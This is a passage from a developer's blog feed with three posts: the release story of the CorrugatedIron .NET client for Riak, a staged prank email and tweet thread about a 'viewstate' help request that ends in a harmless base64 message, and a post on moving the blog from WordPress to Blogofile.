<p>Then on the 12th April, out of the blue again, another email came. I&rsquo;m not going to divulge all the detail, but the crux of it indicated that there was a growing interest in seeing a .NET client for Riak from people in other areas of the world. It also asked what the story was with the client that we were building, and wondered if we had a timeline down with a potential release date.</p>

<p>This was scary, exciting and a slap in the face at the same time. Scary and exciting because there was a possibility that someone out there might want to use what we were building. A slap in the face because we hadn&rsquo;t really done much at all other than the initial commit and a great deal of talking. It was just the wake up call that we needed.</p>

<p>I spoke to JP about the email and we both decided that it was well past time to get our heads down and start working on this thing for real. We needed to lock in a set of features, a time-frame for development and, most importantly, a release date.</p>

<p>So, we did!</p>

<h3>All ahead flank</h3>

<p>In early May, JP and I managed to start freeing up time that we could then contribute to our project. Development ramped up and kicked off in mid-May, and on the 18th, we committed our first changeset to the repository since the very first commit in January. From there, we went nuts!</p>

<p>We consistently worked on things and pushed our code back and forth for the latter half of May and well in to June. At this point, things really started to get exciting.</p>

<p>We had managed to get quite a few features out in a small period of time, and were generally very happy with our progress. JP was making the most of his superior Riak knowledge and was banging out API features like there was no tomorrow. Meanwhile, I had my head down in the guts of the underlying bits, trying to keep things sane.</p>

<p>It was at this point we were told of <em>more</em> people who were keen to get their hands on a quality .NET client, and that if we could get the client ready in time, various individuals would be happy to talk about it during <a href="http://oscon.com/" title="OSCON">OSCON</a>, the biggest Open Source convention I know of. Awesome! This was an opportunity too good to miss.</p>

<p>We finalised our feature-set for v0.1.0, wrote down our final time-line and informed various parties of what we were planning to do. It was locked in. We were heads down, bums-up trying to get things into shape. It was all very exciting.</p>

<h3>Even more interest</h3>

<p>By early July, we had somehow managed to attract the attention of two more individuals who were looking for this functionality. Both of which put their hands up to the opportunity to look at our Alpha software, take it for a spin and give us some feedback. This was awesome. Having other people look over the code and critique it while, in some ways, evaluating it for their own needs is a great thing.</p>

<p>After a short period of time, we received very constructive (and, just quietly, rather gratifying) comments from both guys. It made us feel like we couldn&rsquo;t be doing too badly!</p>

<p>We opened up the repository to them so that they could get the latest code whenever they wanted, and also opened it up to some of the Basho guys so that they could also cast their eyes over it. The cat was slowly coming out of the bad.</p>

<p>On the 20th July, we locked in the feature-set for v0.1.0 and froze the codebase for all but minor changes, bug fixes and tweaks. It was time to do what everyone <em>loves</em> to do: <strong>documentation</strong>.</p>

<p>Given that I tend to hate documentation, straight away I was looking for something else to fill the time with. Thankfully, alongside documentation, we also needed a few sample applications (let&rsquo;s face it, as devs we learn much faster from working code compared to reams of documentation). So I leapt on the opportunity to crank out <a href="https://github.com/DistributedNonsense/CorrugatedIron.Samples/tree/master/VisualStudio2010/Sample.YakRiak" title="YakRiak.NET">YakRiak.NET</a>, a .NET client for <a href="https://github.com/seancribbs" title="Sean Cribbs">Sean Cribbs</a>&lsquo; <a href="https://github.com/seancribbs/yakriak" title="The original YakRiak">YakRiak</a> chat application. It was incredibly simple to do and didn&rsquo;t take very long at all. When building the app, and finally <em>using</em> my own software, I have to admit I felt pretty good. It was nice to use my own software for something fun!</p>

<p>After that, JP put together a new <a href="https://github.com/peschkaj/CorrugatedIron.Samples/tree/master/VisualStudio2010/Sample.SessionStateProvider">Session State Provider</a> which used Riak as the back-end store. How good is that! Riak-backed session state in .NET. Awesome sauce.</p>

<p>I also finalised a small sample application which utilised some of the most common IoC frameworks to wire in the configuration, and began working on the &lsquo;real&rsquo; documentation again.</p>

<h3>&ldquo;Going live&rdquo;</h3>

<p>Finally, on the 25th July, after a couple of months of intense development, sample app creation, documentation and blog posts, CorrugatedIron was released to the world &mdash; just in time for OSCON (phew!).</p>

<p>While the documentation isn&rsquo;t as thorough as we would like, and our unit test coverage isn&rsquo;t as high as we&rsquo;d like, we&rsquo;re very happy with what we&rsquo;ve managed to achieve. This first release is by no means the last, and JP and I are both excited about what we&rsquo;re going to add to it in the future.</p>

<h3>A small side note</h3>

<p>When people first start working on projects like this there is always a risk that personalities will clash and the software will suffer. JP and I knew nothing of each other when we started this thing, yet over time have got to know each other and had a great deal of fun learning from each other. I think I&rsquo;ve been really fortunate in having JP involve himself in this project. He has been open to different ideas and opinions, has never come across as an ass and has been a real pleasure to work with the whole time.</p>

<p>So, JP, thanks mate! I&rsquo;m really glad you got involved. CorrugatedIron wouldn&rsquo;t be what it is now if you hadn&rsquo;t.</p>

<h3>The End</h3>

<p>Thanks for reading this far! If you&rsquo;re a .NET mofo and you&rsquo;re keen to get your Riak on, <a href="https://github.com/DistributedNonsense/CorrugatedIron" title="Source code">grab the source</a>, <a href="https://github.com/DistributedNonsense/CorrugatedIron/downloads" title="Binary downloads">download the binaries</a> or <a href="http://www.nuget.org/List/Packages/CorrugatedIron" title="Nuget package">install the Nuget package</a> and get cracking! Feedback is always welcome, as are patches. So if you&rsquo;ve got something to add, take away or refine, fork our <a href="https://github.com/DistributedNonsense/CorrugatedIron" title="Source code">repository</a> and get those pulls requests happening!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Go With Your Instinct]]></title>
    <link href="http://buffered.io/posts/go-with-your-instinct/"/>
    <updated>2011-02-25T16:31:00+10:00</updated>
    <id>http://buffered.io/posts/go-with-your-instinct</id>
    <content type="html"><![CDATA[<p><a href="http://buffered.io/uploads/2011/02/double-facepalm.jpg" rel="lightbox"><img src="http://buffered.io/uploads/2011/02/double-facepalm.jpg" width="150" style="float:left;margin-right:5px;margin-bottom:5px;" /></a>At an early age I realised that it&rsquo;s not always a bad thing to go with your first instinct. I won&rsquo;t go into the reasons here, nor the way I came to that conclusion. What I will say is that I wish I&rsquo;d listened to my inner-8-year-old-self when I started down the thread of emails and Tweets you&rsquo;re about to read.</p>

<p>Suffice is to say that I have learned my lesson!</p>

<p>The thread speaks for itself. Enjoy :)</p>

<!--more-->






<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 4.15 PM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
Program has crashing on random times. Everything tried is not fix it.<br />
PLEASE THIS IS URGENT ONE NOW. <br />
All detail attached.<br />
I ahve manager breathing down neck have two customer angry.<br />
I look everywhere your blog is kindest help please thank.<br />
Reward in heaven.<br />
Al Soong<br />
<img src="http://buffered.io/uploads/2011/02/attachment.png"/><br/>
</blockquote>


<hr />


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40295102056239104">TheColonial</a></h2>
<p>Third email like this in as many days. Perhaps if &#8220;reward in heaven&#8221; wasn&#8217;t written I may have helped. <a href="http://twitpic.com/42t2sj">http://twitpic.com/42t2sj</a></p>
</div>


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40296042956066816">TheColonial</a></h2>
<p>Shame. All that was in the doc was a very blurry and hard to read image with a stack trace that I can&#8217;t read.</p>
</div>


<hr />


<blockquote>
<strong>From:</strong> OJ<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 4.24 PM<br />
<strong>To:</strong> Alwyn Soong<br />
<strong>Subject:</strong> fix my viewstate<br />
<br /> 
Sorry to hear of your issues. The image that you have sent me is extremely poor quality and I&#8217;m unable to read it. <br />
Please send a screenshot as a PNG/JPG or just copy and paste the text into an email. Don&#8217;t use word.<br />
<br />
OJ<br />
<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 4.17 PM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
happen AGAIN!<br />
<br />

> Program has crashing on random times. Everything tried is not fix it.<br />
> PLEASE THIS IS URGENT ONE NOW. <br />
> All detail attached.<br />
> I ahve manager breathing down neck have two customer angry.<br />
> I look everywhere your blog is kindest help please thank.<br />
> Reward in heaven.<br />
> Al Soong <br />

<br />
</blockquote>


<hr />


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40297392909582336">TheColonial</a></h2>
<p>*sigh* some people have no idea how to get help <a href="http://twitpic.com/42t54u">http://twitpic.com/42t54u</a></p>
</div>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 4.30 PM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
Uninstalling word now. what next?<br />
<br />
</blockquote>


<hr />


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40299003639758848">TheColonial</a></h2>
<p>Christ on a Bike, this guy is writing code?! #fail <a href="http://twitpic.com/42t6s1">http://twitpic.com/42t6s1</a></p>
</div>


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1060266034/twitter_avatar_normal.jpg"/><h2><a href="http://twitter.com/#!/rbanks54/status/40304384470425600">rbanks54</a></h2>
<p>ROFLMAO!!! That&#8217;s priceless. The next step is to tell him to pack his pc in a box because he&#8217;s not qualified to use it</p>
</div>


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40347229483040768">TheColonial</a></h2>
<p>@rbanks54 and this dude is apparently a developer! Fark :-)</p>
</div>


<div class="tweet"><img src="http://a0.twimg.com/profile_images/1187162790/profilepic-2010-12-10_normal.jpg"/><h2><a href="http://twitter.com/#!/DamonOehlman/status/40303061285076992">DamonOehlman</a></h2>
<p>@TheColonial OK, that is awesomely funny. Admittedly you did tell him not to use word :)</p>
</div>


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40304430628868096">TheColonial</a></h2>
<p>@DamonOehlman if someone told you to not use your oven to make ice cream would your rip the oven out of the wall? :-D</p>
</div>


<div class="tweet"><img src="http://a1.twimg.com/profile_images/82675101/n710576649_899427_1819_normal.jpg"/><h2><a href="http://twitter.com/#!/DamianM/status/40300422925254657">DamianM</a></h2>
<p>@TheColonial HAHAHA That&#8217;s awesome! Maybe you tell him he needs to close his windows, his screen will go blank and he&#8217;ll stop bothering you</p>
</div>


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40304606894489600">TheColonial</a></h2>
<p>@DamianM yeah :-) should have gone with my first impulse and ignored him.</p>
</div>


<hr />


<blockquote>
<strong>From:</strong> OJ<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 4.34 PM<br />
<strong>To:</strong> Alwyn Soong<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
Don&#8217;t uninstall word. I&#8217;m asking you to send me the stack trace in a form that I can read!<br />
<br />
Just paste the text of the error into an email directly<br />
<br />
OJ<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 9.30 PM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
Thank you. You are right! Even uninstall word cannot fix of the site.<br />
My normal word is the linux. I cannot find to send you the stack trace in a form. What form is it? <br />
<br />
The citrix not allow cuts and paste. Do you FAX or SKYPE? I read you message.<br />
<br />
This to:<br />
<pre>
Program Location:
   at Microsoft.SqlServer.Management.DataTools.Interop.IDTDocTool.Save(Object dsRef, String path, Boolean okToOverwrite)
   at Microsoft.SqlServer.Management.UI.VSIntegration.Editors.VsDataDesignerNode.Save(VSSAVEFLAGS dwSave, String strSilentSaveAsName, IVsUIShell pIVsUIShell, IntPtr punkDocDataIntPtr, String& strMkDocumentNew, Int32& pfCanceled)
</pre>
<br />
HURRY PLEASE<br />
<br />
Reward in heaven.<br />
Al Soong<br />
<br />
***************************************************************************************************<br />
***Blessed be the Lord who has given rest to his people Israel, according to all that he***<br/>
***promised. Not one word has failed of all his good promise, which he spoke by Moses his***<br />
***servant.                                                                                 ***<br />
***************************************************************************************************<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> OJ<br />
<strong>Date:</strong> Wednesday 23 Feb 2011 10.56 PM<br />
<strong>To:</strong> Alwyn Soong<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
Alwyn,<br />
<br />
Make sure you read what I am saying, and read it properly. I never once told you to uninstall Word, I just told you not to use it to send me the details of your issue.<br />
<br />
Citrix shouldn&#8217;t stop you from copying and pasting, but if it does, take a screenshot like you did before and open &#8220;Paint&#8221;. you should find it in the &#8220;accessories menu&#8221;. when you&#8217;ve opened paint, paste the screenshot in there, and save the image as a jpg, png or bmp. Then attach that to an email and send it to me.<br />
<br />
Sorry, but I am not giving out fax or skype details. Trust me, you&#8217;re getting way more out of this than you deserve.<br />
<br />
OJ<br />
<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Thursday 24 Feb 2011 7.30 AM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
HURRY PLEASE. WE GO LIVE IN 20 MINUTES.<br />
Maybe you look at site yourself and see error please. it is here <a href='http://127.0.0.1:8081/mailout/'>http://127.0.0.1:8081/mailout/</a><br />
Click the MAILOUT button then CHURCH NEWS. Wait for OUTLOOK LOADING stop the blink. Type the MESSAGE for the people and click the GO SEND.<br />
<br />
you to can getting more out of this than you deserve. My company is biggest oil 2nd company in singapore. please to send CV and we keep you remember if new opening. I have email of you will KEEP.<br />
<br />
In heaven please the angels felate you.<br />
Al Soong<br />
<br />
12:1 Therefore, since we are surrounded by so great a cloud of witnesses, let us also lay aside every weight, and sin which clings so closely, and let us run with endurance the race that is set before us, 2 looking to Jesus, the founder and perfecter of our faith, who for the joy that was set before him endured the cross, despising the shame, and is seated at the right hand of the throne of God.<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Thursday 24 Feb 2011 8.29 AM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> fix my viewstate<br />
<br />
Is a windows 32 64
<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Thursday 24 Feb 2011 10.15 AM<br />
<strong>To:</strong> Lingli Farhat<br />
<strong>Cc:</strong> OJ<br />
<strong>Subject:</strong> Re: UPDATE PLEASE<br />
<br />
10 MORE MINUTES and ALL fixed then good friend OJ fixing. Say HI! boardroom.<br />
<br />

> subject: UPDATE PLEASE<br />
> Thursday, 24 February, 2011 12:11 AM<br />
> From: Lingli Farhat<br />
> To: alwyn soong<br />
> AN UPDATE PLEASE ALWYN.<br />
><br />
> WE ARE WAITING FOR YOUR GRACIOUS PRESENCE IN THE BOARD ROOM AND WISH TO HEAR ONLY HAPPY NEWS.<br />
><br />
> OUR PATIENCE IS CERTAINLY TESTED THIS HOUR.<br />
><hr/>
> No one has ever seen God; if we love one another, God abides in us and his love is perfected in us.<br />
><hr/>
> Free POP3 Email from www.gawab.com<br />
> Sign up NOW and get your account @gawab.com!!<br />

</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Lingli Farhat<br />
<strong>Date:</strong> Thursday 24 Feb 2011 10.49 AM<br />
<strong>To:</strong> Alwyn Soong<br />
<strong>Cc:</strong> OJ<br />
<strong>Subject:</strong> RE: re: UPDATE PLEASE<br />
 <br />
TIME IS MOST CERTAINLY &#8220;UP&#8221; ALWYN.<br />
<br />
I HAVE LOOKED AGAIN AND THE EXPLORER IS STILL EMPTY  <a href='http://127.0.0.1:8081/mailout/'>http://127.0.0.1:8081/mailout/</a><br />
<br />
I WILL SEE YOU AND YOUR &#8220;OJ&#8221; FRIEND IN MY OFFICE BEFORE TODAY IS &#8220;UP&#8221; <br />
<br />
FATHER LINGLI FARHAT<br />
<br />
OFFICE OF THE MINISTER<br />
<hr/>
The thoughts of the wicked are an abomination to the Lord, but gracious words are pure.<br />
<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Thursday 24 Feb 2011 11.01 AM<br />
<strong>To:</strong> OJ<br />
<strong>Cc:</strong> Lingli Farhat<br />
<strong>Subject:</strong> RE: re: UPDATE PLEASE<br />
 <br />
OJ good frien please in dark hour. I HAVE THE VIEWSTATE! I HAVE IT! THIS IS HERE<br />
 <br />
Took all day to copy out<br />
 <br />
QSBqb2tlJ3Mgbm90IGEgam9rZSB1bnRpbCBpdCBnb2VzICp0b28qIGZhci4NCkxvdHMgb2YgbG92<br />
ZQ0KTGVvbg0Kd2l0aCBoZWxwIGZyb20gUmh5cyBhbmQgSm9lbC4NCkFsc28gQkNDJ2QgLS0gSm9z<br />
ZXBoLg==<br />
<br />
If you read it for me I get OUT from hair. Expertschange sayt BASE64????? <br />
 <br />
Reward in heaven<br />
Al Soong<br />
CHIEF ENGINEER<br />
 <br />
************************************************************************************************************<br />
***22 But the fruit of the Spirit is love, joy, peace, patience, kindness, goodness, faithfulness,   ***<br/>
***23 gentleness, self-control; against such things there is no law.                                    ***<br />
<br />
************************************************************************************************************<br />
<br />
</blockquote>


<hr />


<p>The garbled text above, when <a href="http://www.motobit.com/util/base64-decoder-encoder.asp">base 64 decoded</a> reads:</p>

<blockquote>
<pre>
A joke's not a joke until it goes *too* far.
Lots of love
Leon
with help from Rhys and Joel.
Also BCC'd -- Joseph.
</pre>
</blockquote>


<hr />


<div class="tweet"><img src="http://a2.twimg.com/profile_images/1234939088/Profile_normal.jpg"/><h2><a href="http://twitter.com/#!/TheColonial/status/40577362336677889">TheColonial</a></h2>
<p>I&#8217;ve just been absolutely owned by some soon to be ex-friends :) Great prank.. you utter, utter bastards :)</p>
</div>


<hr />


<blockquote>
<strong>From:</strong> Alwyn Soong<br />
<strong>Date:</strong> Thursday 24 Feb 2011 11.11 AM<br />
<strong>To:</strong> OJ<br />
<strong>Subject:</strong> ERLANG<br />
<br />
Now i learn erlang.<br />
 <br />
You teach me please.<br />
 <br />
What first? <br />
<br />
</blockquote>


<hr />


<blockquote>
<strong>From:</strong> OJ<br />
<strong>Date:</strong> Thursday 24 Feb 2011 11.56 AM<br />
<strong>To:</strong> Alwyn Soong<br />
<strong>Subject:</strong> RE: ERLANG<br />
<br />
sure.. start with this:<br />

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">self</span><span class="p">()</span> <span class="o">!</span> <span class="n">bullet</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


</blockquote>


<hr />


<p><a href="http://secretgeek.net/">Leon</a>, <a href="http://i-think22.net/">Rhys</a>, <a href="http://callvirt.net/">Joel</a> and to a point <a href="http://jcooney.net/">Joseph</a>: you&rsquo;ve started a war!</p>

<p>Well played :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Now Powered by Blogofile]]></title>
    <link href="http://buffered.io/posts/now-powered-by-blogofile/"/>
    <updated>2011-02-15T20:44:00+10:00</updated>
    <id>http://buffered.io/posts/now-powered-by-blogofile</id>
    <content type="html"><![CDATA[<p><a href="http://buffered.io/uploads/2011/02/V8SFIEngine2001.jpg" title="Time for a new engine" rel="lightbox"><img src="http://buffered.io/uploads/2011/02/V8SFIEngine2001.jpg" width="150" style="float:right;margin-left:5px;margin-bottom:5px;" alt="Time for a new engine"/></a>When I <a href="http://buffered.io/posts/office-registration-and-activation/">first started blogging</a> back in 2006 the platform of choice at the time was <a href="http://wordpress.org/">Wordpress</a>, a feature-rich blogging platform build with <a href="http://www.php.net/">PHP</a>. Since then the platform has improved substantially and the number of community-driven contributions and plug-ins has increased to a massive number. I&rsquo;ve thoroughly enjoyed using Wordpress for the past 5 years and would recommend it to anyone (I already have!) who is looking for a quality blogging platform.</p>

<p>For me, however, Wordpress was becoming less and less appealing. This isn&rsquo;t due to a failing in the platform itself, but more because my needs/desires for my blogging engine were changing.</p>

<!--more-->


<p>One of the curses of maintaining a technical blog is that the posts very quickly &ldquo;expire&rdquo;. Their use-by date can be very short, and hence it becomes a burden to keep them up to date. So far, I&rsquo;ve not done a great job of updating my posts, partly due to laziness, and partly because doing it using Wordpress is a little painful. I was looking for a solution to this problem, and nothing that I could see coming out of the Wordpress community was helping. What I really wanted was to have instant access to posts on my file system, not via a web front-end. Ideally, I would be able to store all of my posts in a <a href="http://hg-scm.org/">Mercurial</a> repository.</p>

<p>I was also tired of having to write posts using straight HTML. I am not a fan of using online editors. Browsers are unpredictable and a stray keystroke can move you from your page to another page, resulting in you losing anything that hasn&rsquo;t been saved along the way. Also, the editors are terrible, relatively featureless and often buggy. Wordpress&rsquo;s editor, while very good, is not my cup of tea. It was getting to the point where I really wanted to write my posts in <a href="http://daringfireball.net/projects/markdown/">Markdown</a> instead. I am aware of some plug-ins which allow this kind of functionality, but my experiences with them weren&rsquo;t that great. I wanted to write things in VIM and easily save/publish to the site without having to leave VIM.</p>

<p>Recently I have received offers of help in updating content from other people in the technical community. They have been interested in getting access to the content so they can contribute in keeping it up to date. Providing access to these people would be painful using Wordpress as a tool. Not because it doesn&rsquo;t do access control, but because the workflow is just unpleasant. Ultimately the ideal scenario is to store my Mercurial repository, with all the posts in it, on <a href="http://bitbucket.org/">Bitbucket</a> so that other people can fork the repository, make changes and submit <a href="http://confluence.atlassian.com/display/BITBUCKET/Forking+a+Bitbucket+Repository">pull requests</a> when they have modified the content. I could easily merge the changes and republish my site.</p>

<p>Apart from the workflow and technical reasons, I was very interested in changing the way the site was served. The blog content is totally static except for two cases, both of which can be handled externally:</p>

<ul>
<li>Comments &ndash; for a while I&rsquo;ve been using <a href="http://disqus.com/">Disqus</a> to handle my comments. The platform is awesome. No spam, no need to get people to sign in to comment, no overhead. Can&rsquo;t recommend it enough.</li>
<li>Post updates &ndash; posts are updated by me and only me. All I needed was a way of converting my posts to a static HTML website and then copying that to my webserver.</li>
</ul>


<p>Since I had no need for a <em>dynamic</em> site, I could easily move away from PHP and database-driven content. All I needed was a bit of help.</p>

<h2>Enter Blogofile</h2>

<blockquote><p>Blogofile is a static website compiler, primarily (though not exclusively) designed to be a simple blogging engine. It requires no database and no special hosting environment. You customize a set of templates with Mako, create posts in a markup language of your choice (see Post Content) and Blogofile renders your entire website as static HTML and Atom/RSS feeds which you can then upload to any old web server you like.</p></blockquote>

<p>Exactly what I need! I&rsquo;m no <a href="http://www.python.org/">Python</a> guru, but I knew I had enough coding chops to pick up the essentials to hack together a template which would suit my needs. I decided to dive in. My plan was:</p>

<ul>
<li>Port my current WP theme to Blogofile (which uses <a href="http://www.makotemplates.org/">Mako</a> behind the scenes).</li>
<li>Hack the engine a little to include:

<ul>
<li>OpenID delegation support</li>
<li>Feedburner support</li>
<li>Google Analytics integration</li>
<li>Series support</li>
</ul>
</li>
<li>Get a <a href="http://aws.amazon.com/free/">free Micro instance</a> running on <a href="http://aws.amazon.com/ec2/">EC2</a> with <a href="http://www.python.org/">Python</a> and <a href="http://hg-scm.org/">Mercurial</a> installed.</li>
<li>Set up a Mercurial hook which regenerates the site and makes it available to the public when content is pushed to the repository.</li>
<li>Migrate the content from the WP site to a set of Markdown posts.</li>
<li>Fix links/images/etc from the previous posts and include them in the new site content.</li>
<li>Hack a few other things to make sure the content looks relatively similar, including the support for the <code>&lt;!--more--&gt;</code> tag (which splits posts in WP).</li>
</ul>


<p>It will come as no surprise that I had to learn a little bit along the way :) I&rsquo;m now exposed to how Python hangs together, and I have a (relatively) solid grasp of Mako templates.</p>

<p>The net result is the site that you&rsquo;re now looking at! From my side of the planet the speed different is noticable, and the experience of publishing to it is as simple as <code>hg commit -m "message" &amp;&amp; hg push web</code> &ndash; I don&rsquo;t have to leave VIM at all to do that. All of my goals have been met, and I&rsquo;m happy :)</p>

<p>Now this task is out of the way, I&rsquo;ll be continuing work on my <a href="http://buffered.io/series/web-development-with-erlang/">Erlang blog series</a>. I&rsquo;m looking forward to having the next post done and ready for your critique.</p>

<p>For those of you considering other blogging platforms which suit different workflows better than the mainstream options, be sure to check <a href="http://blogofile.com/">Blogofile</a> out. It&rsquo;s a great system, and worth the effort of diving into. I&rsquo;m happy to answer questions if you have any.</p>

<p>Until next time!</p>
]]></content>
  </entry>
  
</feed>
